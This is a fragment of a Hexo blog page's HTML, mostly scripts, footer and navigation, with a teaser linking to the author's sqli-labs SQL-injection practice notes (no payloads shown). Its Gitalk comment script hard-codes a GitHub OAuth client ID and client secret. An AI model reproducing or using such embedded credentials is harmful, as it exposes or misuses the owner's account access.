+								[NOTE] sqli-labs Basic Challenges前言针对sqli-labs靶场的做题笔记
+环境虚拟机环境攻击机：kali 10.10.10.1靶机：ubuntu 10.10.10.2 小皮面板搭建Web服务
+Less...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/15/sqli-labs-Basic-Challenges/" title="sqli-labs Basic Challenges">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/rickroll.jpg" alt="sqli-labs Basic Challenges"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
